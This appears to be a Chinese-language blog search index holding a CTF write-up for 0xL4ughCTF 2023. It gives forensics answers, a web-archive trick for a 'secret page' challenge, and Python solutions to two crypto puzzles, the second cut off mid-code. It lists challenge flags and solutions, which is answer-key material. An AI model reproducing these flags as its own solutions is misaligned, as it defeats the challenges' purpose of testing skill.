<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>0xL4ughCTF2023</title>
    <link href="/2023/02/19/0xL4ughCTF/"/>
    <url>/2023/02/19/0xL4ughCTF/</url>
    
    <content type="html"><![CDATA[<p><strong>部分附件(包含wp内所有题目)：链接：<a href="https://pan.baidu.com/s/19YZXz_T0S3ZCEbnHkdlV0g?pwd=6666">https://pan.baidu.com/s/19YZXz_T0S3ZCEbnHkdlV0g?pwd=6666</a></strong><br><strong>提取码：6666</strong></p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="att-ip"><a href="#att-ip" class="headerlink" title="att ip"></a>att ip</h3><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/0xl4/1.png"><br><code>0xL4ugh&#123;91.243.59.76_23927&#125;</code></p><h3 id="PVE"><a href="#PVE" class="headerlink" title="PVE"></a>PVE</h3><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><h5 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h5><p>volatility3查看linux版本<br><code>0xL4ugh&#123;Ubuntu_4.4.0-186-generic&#125;</code></p><h5 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h5><p><img src="/mdimg/0xl4/2.png"><br><code>0xL4ugh&#123;2.2.14&#125;</code></p><h5 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h5><p><img src="/mdimg/0xl4/3.png"><br><code>0xL4ugh&#123;S4D_Y0U_G07_M3&#125;</code></p><h5 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h5><p><img src="/mdimg/0xl4/4.png"><br><code>0xL4ugh&#123;H1DD3N_1N_PR0CE$$&#125;</code></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Bypass-Basic"><a href="#Bypass-Basic" class="headerlink" title="Bypass ( Basic )"></a>Bypass ( Basic )</h3><h4 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h4><p>Some one reported to our Bug Bounty Program that he found a secret page that discloses some senstive information and we forbidden any access to it <a href="http://20.121.121.120/secret.php">link</a><br>Author : abdoghazy</p><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p><a href="http://web.archive.org/">http://web.archive.org/</a><br><img src="/mdimg/0xl4/5.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto 1"></a>Crypto 1</h3><h4 id="题目说明-1"><a href="#题目说明-1" class="headerlink" title="题目说明"></a>题目说明</h4><p>Alice and Bob decided to create their own super cryptosystem. However.. it has a super flaw<br>Flag : OSC{}</p><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ct = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">40</span>, <span class="hljs-number">79</span>, <span class="hljs-number">159</span>, <span class="hljs-number">317</span>, <span class="hljs-number">635</span>, <span class="hljs-number">1269</span>, <span class="hljs-number">2538</span>, <span class="hljs-number">5077</span>, <span class="hljs-number">10154</span>, <span class="hljs-number">20307</span>, <span class="hljs-number">40615</span>, <span class="hljs-number">81229</span>, <span class="hljs-number">162458</span>, <span class="hljs-number">324916</span>, <span class="hljs-number">649832</span>, <span class="hljs-number">1299665</span>, <span class="hljs-number">2599330</span>, <span class="hljs-number">5198659</span>, <span class="hljs-number">10397319</span>, <span class="hljs-number">20794638</span>, <span class="hljs-number">41589276</span>, <span class="hljs-number">83178552</span>, <span class="hljs-number">166357103</span>, <span class="hljs-number">332714207</span>, <span class="hljs-number">665428414</span>, <span class="hljs-number">1330856827</span>, <span class="hljs-number">2661713655</span>, <span class="hljs-number">5323427309</span>, <span class="hljs-number">10646854619</span>, <span class="hljs-number">21293709237</span>, <span class="hljs-number">42587418474</span>, <span class="hljs-number">85174836949</span>, <span class="hljs-number">170349673898</span>, <span class="hljs-number">340699347795</span>, <span class="hljs-number">681398695591</span>, <span class="hljs-number">1362797391181</span>, <span class="hljs-number">2725594782363</span>, <span class="hljs-number">5451189564725</span>, <span class="hljs-number">10902379129451</span>, <span class="hljs-number">21804758258901</span>, <span class="hljs-number">43609516517803</span>, <span class="hljs-number">87219033035605</span>, <span class="hljs-number">174438066071211</span>, <span class="hljs-number">348876132142421</span>, <span class="hljs-number">697752264284843</span>, <span class="hljs-number">1395504528569685</span>, <span class="hljs-number">2791009057139370</span>, <span class="hljs-number">5582018114278740</span>, <span class="hljs-number">11164036228557480</span>, <span class="hljs-number">22328072457114960</span>, <span class="hljs-number">44656144914229920</span>, <span class="hljs-number">89312289828459841</span>, <span class="hljs-number">178624579656919682</span>, <span class="hljs-number">357249159313839363</span>, <span class="hljs-number">714498318627678726</span>, <span class="hljs-number">1428996637255357453</span>, <span class="hljs-number">2857993274510714906</span>, <span class="hljs-number">5715986549021429811</span>, <span class="hljs-number">11431973098042859623</span>, <span class="hljs-number">22863946196085719246</span>, <span class="hljs-number">45727892392171438492</span>, <span class="hljs-number">91455784784342876983</span>, <span class="hljs-number">182911569568685753966</span>, <span class="hljs-number">365823139137371507933</span>, <span class="hljs-number">731646278274743015865</span>, <span class="hljs-number">1463292556549486031730</span>, <span class="hljs-number">2926585113098972063460</span>, <span class="hljs-number">5853170226197944126921</span>, <span class="hljs-number">11706340452395888253841</span>, <span class="hljs-number">23412680904791776507682</span>, <span class="hljs-number">46825361809583553015364</span>, <span class="hljs-number">93650723619167106030728</span>, <span class="hljs-number">187301447238334212061457</span>, <span class="hljs-number">374602894476668424122913</span>, <span class="hljs-number">749205788953336848245827</span>, <span class="hljs-number">1498411577906673696491653</span>, <span class="hljs-number">2996823155813347392983306</span>, <span class="hljs-number">5993646311626694785966613</span>, <span class="hljs-number">11987292623253389571933226</span>, <span class="hljs-number">23974585246506779143866452</span>, <span class="hljs-number">47949170493013558287732903</span>, <span class="hljs-number">95898340986027116575465806</span>, <span class="hljs-number">191796681972054233150931613</span>, <span class="hljs-number">383593363944108466301863225</span>, <span class="hljs-number">767186727888216932603726450</span>, <span class="hljs-number">1534373455776433865207452900</span>, <span class="hljs-number">3068746911552867730414905800</span>, <span class="hljs-number">6137493823105735460829811601</span>, <span class="hljs-number">12274987646211470921659623202</span>, <span class="hljs-number">24549975292422941843319246403</span>, <span class="hljs-number">49099950584845883686638492807</span>, <span class="hljs-number">98199901169691767373276985614</span>, <span class="hljs-number">196399802339383534746553971228</span>, <span class="hljs-number">392799604678767069493107942455</span>, <span class="hljs-number">785599209357534138986215884910</span>, <span class="hljs-number">1571198418715068277972431769821</span>, <span class="hljs-number">3142396837430136555944863539641</span>, <span class="hljs-number">6284793674860273111889727079282</span>, <span class="hljs-number">12569587349720546223779454158564</span>, <span class="hljs-number">25139174699441092447558908317129</span>, <span class="hljs-number">50278349398882184895117816634258</span>, <span class="hljs-number">100556698797764369790235633268515</span>, <span class="hljs-number">201113397595528739580471266537030</span>, <span class="hljs-number">402226795191057479160942533074061</span>, <span class="hljs-number">804453590382114958321885066148122</span>, <span class="hljs-number">1608907180764229916643770132296243</span>, <span class="hljs-number">3217814361528459833287540264592486</span>, <span class="hljs-number">6435628723056919666575080529184973</span>, <span class="hljs-number">12871257446113839333150161058369946</span>, <span class="hljs-number">25742514892227678666300322116739891</span>, <span class="hljs-number">51485029784455357332600644233479783</span>, <span class="hljs-number">102970059568910714665201288466959565</span>, <span class="hljs-number">205940119137821429330402576933919130</span>, <span class="hljs-number">411880238275642858660805153867838260</span>, <span class="hljs-number">823760476551285717321610307735676520</span>, <span class="hljs-number">1647520953102571434643220615471353041</span>, <span class="hljs-number">3295041906205142869286441230942706082</span>, <span class="hljs-number">6590083812410285738572882461885412163</span>, <span class="hljs-number">13180167624820571477145764923770824327</span>, <span class="hljs-number">26360335249641142954291529847541648653</span>, <span class="hljs-number">52720670499282285908583059695083297307</span>, <span class="hljs-number">105441340998564571817166119390166594613</span>, <span class="hljs-number">210882681997129143634332238780333189226</span>, <span class="hljs-number">421765363994258287268664477560666378453</span>, <span class="hljs-number">843530727988516574537328955121332756906</span>, <span class="hljs-number">1687061455977033149074657910242665513811</span>, <span class="hljs-number">3374122911954066298149315820485331027622</span>, <span class="hljs-number">6748245823908132596298631640970662055244</span>, <span class="hljs-number">13496491647816265192597263281941324110489</span>, <span class="hljs-number">26992983295632530385194526563882648220977</span>, <span class="hljs-number">53985966591265060770389053127765296441955</span>, <span class="hljs-number">107971933182530121540778106255530592883909</span>, <span class="hljs-number">215943866365060243081556212511061185767818</span>, <span class="hljs-number">431887732730120486163112425022122371535637</span>, <span class="hljs-number">863775465460240972326224850044244743071274</span>, <span class="hljs-number">1727550930920481944652449700088489486142548</span>, <span class="hljs-number">3455101861840963889304899400176978972285095</span>, <span class="hljs-number">6910203723681927778609798800353957944570190</span>, <span class="hljs-number">13820407447363855557219597600707915889140381</span>, <span class="hljs-number">27640814894727711114439195201415831778280761</span>, <span class="hljs-number">55281629789455422228878390402831663556561522</span>, <span class="hljs-number">110563259578910844457756780805663327113123044</span>, <span class="hljs-number">221126519157821688915513561611326654226246089</span>, <span class="hljs-number">442253038315643377831027123222653308452492178</span>, <span class="hljs-number">884506076631286755662054246445306616904984356</span>, <span class="hljs-number">1769012153262573511324108492890613233809968711</span>, <span class="hljs-number">3538024306525147022648216985781226467619937423</span>, <span class="hljs-number">7076048613050294045296433971562452935239874845</span>, <span class="hljs-number">14152097226100588090592867943124905870479749691</span>, <span class="hljs-number">28304194452201176181185735886249811740959499382</span>, <span class="hljs-number">56608388904402352362371471772499623481918998764</span>, <span class="hljs-number">113216777808804704724742943544999246963837997528</span>, <span class="hljs-number">226433555617609409449485887089998493927675995056</span>, <span class="hljs-number">452867111235218818898971774179996987855351990111</span>, <span class="hljs-number">905734222470437637797943548359993975710703980222</span>, <span class="hljs-number">1811468444940875275595887096719987951421407960445</span>, <span class="hljs-number">3622936889881750551191774193439975902842815920890</span>, <span class="hljs-number">7245873779763501102383548386879951805685631841779</span>, <span class="hljs-number">14491747559527002204767096773759903611371263683559</span>, <span class="hljs-number">28983495119054004409534193547519807222742527367117</span>, <span class="hljs-number">57966990238108008819068387095039614445485054734235</span>, <span class="hljs-number">115933980476216017638136774190079228890970109468469</span>, <span class="hljs-number">231867960952432035276273548380158457781940218936938</span>, <span class="hljs-number">463735921904864070552547096760316915563880437873877</span>, <span class="hljs-number">927471843809728141105094193520633831127760875747754</span>, <span class="hljs-number">1854943687619456282210188387041267662255521751495507</span>, <span class="hljs-number">3709887375238912564420376774082535324511043502991014</span>, <span class="hljs-number">7419774750477825128840753548165070649022087005982029</span>, <span class="hljs-number">14839549500955650257681507096330141298044174011964058</span>, <span class="hljs-number">29679099001911300515363014192660282596088348023928115</span>, <span class="hljs-number">59358198003822601030726028385320565192176696047856231</span>, <span class="hljs-number">118716396007645202061452056770641130384353392095712461</span>, <span class="hljs-number">237432792015290404122904113541282260768706784191424923</span>, <span class="hljs-number">474865584030580808245808227082564521537413568382849845</span>, <span class="hljs-number">949731168061161616491616454165129043074827136765699690</span>, <span class="hljs-number">1899462336122323232983232908330258086149654273531399380</span>, <span class="hljs-number">3798924672244646465966465816660516172299308547062798761</span>, <span class="hljs-number">7597849344489292931932931633321032344598617094125597521</span>, <span class="hljs-number">15195698688978585863865863266642064689197234188251195043</span>, <span class="hljs-number">30391397377957171727731726533284129378394468376502390085</span>, <span class="hljs-number">60782794755914343455463453066568258756788936753004780171</span>, <span class="hljs-number">121565589511828686910926906133136517513577873506009560341</span>, <span class="hljs-number">243131179023657373821853812266273035027155747012019120683</span>, <span class="hljs-number">486262358047314747643707624532546070054311494024038241365</span>, <span class="hljs-number">972524716094629495287415249065092140108622988048076482731</span>, <span class="hljs-number">1945049432189258990574830498130184280217245976096152965461</span>, <span class="hljs-number">3890098864378517981149660996260368560434491952192305930922</span>, <span class="hljs-number">7780197728757035962299321992520737120868983904384611861845</span>, <span class="hljs-number">15560395457514071924598643985041474241737967808769223723690</span>, <span class="hljs-number">31120790915028143849197287970082948483475935617538447447379</span>, <span class="hljs-number">62241581830056287698394575940165896966951871235076894894758</span>, <span class="hljs-number">124483163660112575396789151880331793933903742470153789789517</span>, <span class="hljs-number">248966327320225150793578303760663587867807484940307579579034</span>, <span class="hljs-number">497932654640450301587156607521327175735614969880615159158067</span>, <span class="hljs-number">995865309280900603174313215042654351471229939761230318316135</span>, <span class="hljs-number">1991730618561801206348626430085308702942459879522460636632269</span>, <span class="hljs-number">3983461237123602412697252860170617405884919759044921273264538</span>, <span class="hljs-number">7966922474247204825394505720341234811769839518089842546529077</span>, <span class="hljs-number">15933844948494409650789011440682469623539679036179685093058154</span>, <span class="hljs-number">31867689896988819301578022881364939247079358072359370186116308</span>, <span class="hljs-number">63735379793977638603156045762729878494158716144718740372232615</span>, <span class="hljs-number">127470759587955277206312091525459756988317432289437480744465230</span>, <span class="hljs-number">254941519175910554412624183050919513976634864578874961488930461</span>, <span class="hljs-number">509883038351821108825248366101839027953269729157749922977860921</span>, <span class="hljs-number">1019766076703642217650496732203678055906539458315499845955721842</span>, <span class="hljs-number">2039532153407284435300993464407356111813078916630999691911443684</span>, <span class="hljs-number">4079064306814568870601986928814712223626157833261999383822887368</span>, <span class="hljs-number">8158128613629137741203973857629424447252315666523998767645774737</span>, <span class="hljs-number">16316257227258275482407947715258848894504631333047997535291549474</span>, <span class="hljs-number">32632514454516550964815895430517697789009262666095995070583098947</span>, <span class="hljs-number">65265028909033101929631790861035395578018525332191990141166197894</span>, <span class="hljs-number">130530057818066203859263581722070791156037050664383980282332395789</span>, <span class="hljs-number">261060115636132407718527163444141582312074101328767960564664791578</span>, <span class="hljs-number">522120231272264815437054326888283164624148202657535921129329583155</span>, <span class="hljs-number">1044240462544529630874108653776566329248296405315071842258659166310</span>, <span class="hljs-number">2088480925089059261748217307553132658496592810630143684517318332621</span>, <span class="hljs-number">4176961850178118523496434615106265316993185621260287369034636665242</span>, <span class="hljs-number">8353923700356237046992869230212530633986371242520574738069273330483</span>, <span class="hljs-number">16707847400712474093985738460425061267972742485041149476138546660967</span>, <span class="hljs-number">33415694801424948187971476920850122535945484970082298952277093321934</span>, <span class="hljs-number">66831389602849896375942953841700245071890969940164597904554186643868</span>, <span class="hljs-number">133662779205699792751885907683400490143781939880329195809108373287736</span>, <span class="hljs-number">267325558411399585503771815366800980287563879760658391618216746575472</span>, <span class="hljs-number">534651116822799171007543630733601960575127759521316783236433493150943</span>, <span class="hljs-number">1069302233645598342015087261467203921150255519042633566472866986301887</span>]<br></code></pre></td></tr></table></figure><p>一个规律：<br>从第2个数开始，每个数与前面的数之和的差总为0或者1，由此可以得到2进制数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">ct = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">40</span>, <span class="hljs-number">79</span>, <span class="hljs-number">159</span>, <span class="hljs-number">317</span>, <span class="hljs-number">635</span>, <span class="hljs-number">1269</span>, <span class="hljs-number">2538</span>, <span class="hljs-number">5077</span>, <span class="hljs-number">10154</span>, <span class="hljs-number">20307</span>, <span class="hljs-number">40615</span>, <span class="hljs-number">81229</span>, <span class="hljs-number">162458</span>, <span class="hljs-number">324916</span>, <span class="hljs-number">649832</span>, <span class="hljs-number">1299665</span>, <span class="hljs-number">2599330</span>, <span class="hljs-number">5198659</span>, <span class="hljs-number">10397319</span>, <span class="hljs-number">20794638</span>, <span class="hljs-number">41589276</span>, <span class="hljs-number">83178552</span>, <span class="hljs-number">166357103</span>, <span class="hljs-number">332714207</span>, <span class="hljs-number">665428414</span>, <span class="hljs-number">1330856827</span>, <span class="hljs-number">2661713655</span>, <span class="hljs-number">5323427309</span>, <span class="hljs-number">10646854619</span>, <span class="hljs-number">21293709237</span>, <span class="hljs-number">42587418474</span>, <span class="hljs-number">85174836949</span>, <span class="hljs-number">170349673898</span>, <span class="hljs-number">340699347795</span>, <span class="hljs-number">681398695591</span>, <span class="hljs-number">1362797391181</span>, <span class="hljs-number">2725594782363</span>, <span class="hljs-number">5451189564725</span>, <span class="hljs-number">10902379129451</span>, <span class="hljs-number">21804758258901</span>, <span class="hljs-number">43609516517803</span>, <span class="hljs-number">87219033035605</span>, <span class="hljs-number">174438066071211</span>, <span class="hljs-number">348876132142421</span>, <span class="hljs-number">697752264284843</span>, <span class="hljs-number">1395504528569685</span>, <span class="hljs-number">2791009057139370</span>, <span class="hljs-number">5582018114278740</span>, <span class="hljs-number">11164036228557480</span>, <span class="hljs-number">22328072457114960</span>, <span class="hljs-number">44656144914229920</span>, <span class="hljs-number">89312289828459841</span>, <span class="hljs-number">178624579656919682</span>, <span class="hljs-number">357249159313839363</span>, <span class="hljs-number">714498318627678726</span>, <span class="hljs-number">1428996637255357453</span>, <span class="hljs-number">2857993274510714906</span>, <span class="hljs-number">5715986549021429811</span>, <span class="hljs-number">11431973098042859623</span>, <span class="hljs-number">22863946196085719246</span>, <span class="hljs-number">45727892392171438492</span>, <span class="hljs-number">91455784784342876983</span>, <span class="hljs-number">182911569568685753966</span>, <span class="hljs-number">365823139137371507933</span>, <span class="hljs-number">731646278274743015865</span>, <span class="hljs-number">1463292556549486031730</span>, <span class="hljs-number">2926585113098972063460</span>, <span class="hljs-number">5853170226197944126921</span>, <span class="hljs-number">11706340452395888253841</span>, <span class="hljs-number">23412680904791776507682</span>, <span class="hljs-number">46825361809583553015364</span>, <span class="hljs-number">93650723619167106030728</span>, <span class="hljs-number">187301447238334212061457</span>, <span class="hljs-number">374602894476668424122913</span>, <span class="hljs-number">749205788953336848245827</span>, <span class="hljs-number">1498411577906673696491653</span>, <span class="hljs-number">2996823155813347392983306</span>, <span class="hljs-number">5993646311626694785966613</span>, <span class="hljs-number">11987292623253389571933226</span>, <span class="hljs-number">23974585246506779143866452</span>, <span class="hljs-number">47949170493013558287732903</span>, <span class="hljs-number">95898340986027116575465806</span>, <span class="hljs-number">191796681972054233150931613</span>, <span class="hljs-number">383593363944108466301863225</span>, <span class="hljs-number">767186727888216932603726450</span>, <span class="hljs-number">1534373455776433865207452900</span>, <span class="hljs-number">3068746911552867730414905800</span>, <span class="hljs-number">6137493823105735460829811601</span>, <span class="hljs-number">12274987646211470921659623202</span>, <span class="hljs-number">24549975292422941843319246403</span>, <span class="hljs-number">49099950584845883686638492807</span>, <span class="hljs-number">98199901169691767373276985614</span>, <span class="hljs-number">196399802339383534746553971228</span>, <span class="hljs-number">392799604678767069493107942455</span>, <span class="hljs-number">785599209357534138986215884910</span>, <span class="hljs-number">1571198418715068277972431769821</span>, <span class="hljs-number">3142396837430136555944863539641</span>, <span class="hljs-number">6284793674860273111889727079282</span>, <span class="hljs-number">12569587349720546223779454158564</span>, <span class="hljs-number">25139174699441092447558908317129</span>, <span class="hljs-number">50278349398882184895117816634258</span>, <span class="hljs-number">100556698797764369790235633268515</span>, <span class="hljs-number">201113397595528739580471266537030</span>, <span class="hljs-number">402226795191057479160942533074061</span>, <span class="hljs-number">804453590382114958321885066148122</span>, <span class="hljs-number">1608907180764229916643770132296243</span>, <span class="hljs-number">3217814361528459833287540264592486</span>, <span class="hljs-number">6435628723056919666575080529184973</span>, <span class="hljs-number">12871257446113839333150161058369946</span>, <span class="hljs-number">25742514892227678666300322116739891</span>, <span class="hljs-number">51485029784455357332600644233479783</span>, <span class="hljs-number">102970059568910714665201288466959565</span>, <span class="hljs-number">205940119137821429330402576933919130</span>, <span class="hljs-number">411880238275642858660805153867838260</span>, <span class="hljs-number">823760476551285717321610307735676520</span>, <span class="hljs-number">1647520953102571434643220615471353041</span>, <span class="hljs-number">3295041906205142869286441230942706082</span>, <span class="hljs-number">6590083812410285738572882461885412163</span>, <span class="hljs-number">13180167624820571477145764923770824327</span>, <span class="hljs-number">26360335249641142954291529847541648653</span>, <span class="hljs-number">52720670499282285908583059695083297307</span>, <span class="hljs-number">105441340998564571817166119390166594613</span>, <span class="hljs-number">210882681997129143634332238780333189226</span>, <span class="hljs-number">421765363994258287268664477560666378453</span>, <span class="hljs-number">843530727988516574537328955121332756906</span>, <span class="hljs-number">1687061455977033149074657910242665513811</span>, <span class="hljs-number">3374122911954066298149315820485331027622</span>, <span class="hljs-number">6748245823908132596298631640970662055244</span>, <span class="hljs-number">13496491647816265192597263281941324110489</span>, <span class="hljs-number">26992983295632530385194526563882648220977</span>, <span class="hljs-number">53985966591265060770389053127765296441955</span>, <span class="hljs-number">107971933182530121540778106255530592883909</span>, <span class="hljs-number">215943866365060243081556212511061185767818</span>, <span class="hljs-number">431887732730120486163112425022122371535637</span>, <span class="hljs-number">863775465460240972326224850044244743071274</span>, <span class="hljs-number">1727550930920481944652449700088489486142548</span>, <span class="hljs-number">3455101861840963889304899400176978972285095</span>, <span class="hljs-number">6910203723681927778609798800353957944570190</span>, <span class="hljs-number">13820407447363855557219597600707915889140381</span>, <span class="hljs-number">27640814894727711114439195201415831778280761</span>, <span class="hljs-number">55281629789455422228878390402831663556561522</span>, <span class="hljs-number">110563259578910844457756780805663327113123044</span>, <span class="hljs-number">221126519157821688915513561611326654226246089</span>, <span class="hljs-number">442253038315643377831027123222653308452492178</span>, <span class="hljs-number">884506076631286755662054246445306616904984356</span>, <span class="hljs-number">1769012153262573511324108492890613233809968711</span>, <span class="hljs-number">3538024306525147022648216985781226467619937423</span>, <span class="hljs-number">7076048613050294045296433971562452935239874845</span>, <span class="hljs-number">14152097226100588090592867943124905870479749691</span>, <span class="hljs-number">28304194452201176181185735886249811740959499382</span>, <span class="hljs-number">56608388904402352362371471772499623481918998764</span>, <span class="hljs-number">113216777808804704724742943544999246963837997528</span>, <span class="hljs-number">226433555617609409449485887089998493927675995056</span>, <span class="hljs-number">452867111235218818898971774179996987855351990111</span>, <span class="hljs-number">905734222470437637797943548359993975710703980222</span>, <span class="hljs-number">1811468444940875275595887096719987951421407960445</span>, <span class="hljs-number">3622936889881750551191774193439975902842815920890</span>, <span class="hljs-number">7245873779763501102383548386879951805685631841779</span>, <span class="hljs-number">14491747559527002204767096773759903611371263683559</span>, <span class="hljs-number">28983495119054004409534193547519807222742527367117</span>, <span class="hljs-number">57966990238108008819068387095039614445485054734235</span>, <span class="hljs-number">115933980476216017638136774190079228890970109468469</span>, <span class="hljs-number">231867960952432035276273548380158457781940218936938</span>, <span class="hljs-number">463735921904864070552547096760316915563880437873877</span>, <span class="hljs-number">927471843809728141105094193520633831127760875747754</span>, <span class="hljs-number">1854943687619456282210188387041267662255521751495507</span>, <span class="hljs-number">3709887375238912564420376774082535324511043502991014</span>, <span class="hljs-number">7419774750477825128840753548165070649022087005982029</span>, <span class="hljs-number">14839549500955650257681507096330141298044174011964058</span>, <span class="hljs-number">29679099001911300515363014192660282596088348023928115</span>, <span class="hljs-number">59358198003822601030726028385320565192176696047856231</span>, <span class="hljs-number">118716396007645202061452056770641130384353392095712461</span>, <span class="hljs-number">237432792015290404122904113541282260768706784191424923</span>, <span class="hljs-number">474865584030580808245808227082564521537413568382849845</span>, <span class="hljs-number">949731168061161616491616454165129043074827136765699690</span>, <span class="hljs-number">1899462336122323232983232908330258086149654273531399380</span>, <span class="hljs-number">3798924672244646465966465816660516172299308547062798761</span>, <span class="hljs-number">7597849344489292931932931633321032344598617094125597521</span>, <span class="hljs-number">15195698688978585863865863266642064689197234188251195043</span>, <span class="hljs-number">30391397377957171727731726533284129378394468376502390085</span>, <span class="hljs-number">60782794755914343455463453066568258756788936753004780171</span>, <span class="hljs-number">121565589511828686910926906133136517513577873506009560341</span>, <span class="hljs-number">243131179023657373821853812266273035027155747012019120683</span>, <span class="hljs-number">486262358047314747643707624532546070054311494024038241365</span>, <span class="hljs-number">972524716094629495287415249065092140108622988048076482731</span>, <span class="hljs-number">1945049432189258990574830498130184280217245976096152965461</span>, <span class="hljs-number">3890098864378517981149660996260368560434491952192305930922</span>, <span class="hljs-number">7780197728757035962299321992520737120868983904384611861845</span>, <span class="hljs-number">15560395457514071924598643985041474241737967808769223723690</span>, <span class="hljs-number">31120790915028143849197287970082948483475935617538447447379</span>, <span class="hljs-number">62241581830056287698394575940165896966951871235076894894758</span>, <span class="hljs-number">124483163660112575396789151880331793933903742470153789789517</span>, <span class="hljs-number">248966327320225150793578303760663587867807484940307579579034</span>, <span class="hljs-number">497932654640450301587156607521327175735614969880615159158067</span>, <span class="hljs-number">995865309280900603174313215042654351471229939761230318316135</span>, <span class="hljs-number">1991730618561801206348626430085308702942459879522460636632269</span>, <span class="hljs-number">3983461237123602412697252860170617405884919759044921273264538</span>, <span class="hljs-number">7966922474247204825394505720341234811769839518089842546529077</span>, <span class="hljs-number">15933844948494409650789011440682469623539679036179685093058154</span>, <span class="hljs-number">31867689896988819301578022881364939247079358072359370186116308</span>, <span class="hljs-number">63735379793977638603156045762729878494158716144718740372232615</span>, <span class="hljs-number">127470759587955277206312091525459756988317432289437480744465230</span>, <span class="hljs-number">254941519175910554412624183050919513976634864578874961488930461</span>, <span class="hljs-number">509883038351821108825248366101839027953269729157749922977860921</span>, <span class="hljs-number">1019766076703642217650496732203678055906539458315499845955721842</span>, <span class="hljs-number">2039532153407284435300993464407356111813078916630999691911443684</span>, <span class="hljs-number">4079064306814568870601986928814712223626157833261999383822887368</span>, <span class="hljs-number">8158128613629137741203973857629424447252315666523998767645774737</span>, <span class="hljs-number">16316257227258275482407947715258848894504631333047997535291549474</span>, <span class="hljs-number">32632514454516550964815895430517697789009262666095995070583098947</span>, <span class="hljs-number">65265028909033101929631790861035395578018525332191990141166197894</span>, <span class="hljs-number">130530057818066203859263581722070791156037050664383980282332395789</span>, <span class="hljs-number">261060115636132407718527163444141582312074101328767960564664791578</span>, <span class="hljs-number">522120231272264815437054326888283164624148202657535921129329583155</span>, <span class="hljs-number">1044240462544529630874108653776566329248296405315071842258659166310</span>, <span class="hljs-number">2088480925089059261748217307553132658496592810630143684517318332621</span>, <span class="hljs-number">4176961850178118523496434615106265316993185621260287369034636665242</span>, <span class="hljs-number">8353923700356237046992869230212530633986371242520574738069273330483</span>, <span class="hljs-number">16707847400712474093985738460425061267972742485041149476138546660967</span>, <span class="hljs-number">33415694801424948187971476920850122535945484970082298952277093321934</span>, <span class="hljs-number">66831389602849896375942953841700245071890969940164597904554186643868</span>, <span class="hljs-number">133662779205699792751885907683400490143781939880329195809108373287736</span>, <span class="hljs-number">267325558411399585503771815366800980287563879760658391618216746575472</span>, <span class="hljs-number">534651116822799171007543630733601960575127759521316783236433493150943</span>, <span class="hljs-number">1069302233645598342015087261467203921150255519042633566472866986301887</span>]<br>x = <span class="hljs-number">0</span><br>y = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(ct)):<br>   y += <span class="hljs-built_in">str</span>(ct[i]-x)<br>   x += ct[i]<br><span class="hljs-built_in">print</span>(y)<br><span class="hljs-comment">#100111101010011010000110111101101010011010101010101000000110011011100100010000101001110010000110111001000110011001101000011010100110001010011100100011101011111001101010011001101010001010101010011001101001110010000110011001101111101</span><br><br></code></pre></td></tr></table></figure><p>发现只有231位，前面要补一个0<br><img src="/mdimg/0xl4/15.png"></p><h3 id="Crypto-2"><a href="#Crypto-2" class="headerlink" title="Crypto 2"></a>Crypto 2</h3><h4 id="题目说明-2"><a href="#题目说明-2" class="headerlink" title="题目说明"></a>题目说明</h4><p>the professor asked the students to write a paragraph of a story each and submit it by email. But some students copied answers!<br>format : OSC{}</p><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, getPrime<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> messages<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">RSA_encrypt</span>(<span class="hljs-params">message</span>):<br>    m = bytes_to_long(message)<br>    p = getPrime(<span class="hljs-number">1024</span>)<br>    q = getPrime(<span class="hljs-number">1024</span>)<br>    N = p * q<br>    e = <span class="hljs-number">3</span><br>    c = <span class="hljs-built_in">pow</span>(m, e, N)<br>    <span class="hljs-keyword">return</span> N, e, c<br><br><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> messages:<br>    N, e, c = RSA_encrypt(m)<br>    <span 